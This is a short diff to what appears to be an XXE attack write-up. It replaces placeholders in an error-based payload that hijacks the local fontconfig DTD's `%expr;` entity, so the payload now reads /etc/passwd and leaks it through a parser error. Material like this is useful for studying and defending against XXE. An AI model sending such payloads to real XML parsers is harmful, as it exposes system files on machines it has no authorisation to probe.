@@ -130,8 +130,8 @@ The danger here is that an attacker can define this `%expr;` variable **before**
     <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
     <!-- Overwrite the %expr; entity to inject our error-based entities -->
     <!ENTITY % expr 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///FILE_TO_READ">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
         &#x25;eval;
         &#x25;error;
         <!ELEMENT aa (bb'>
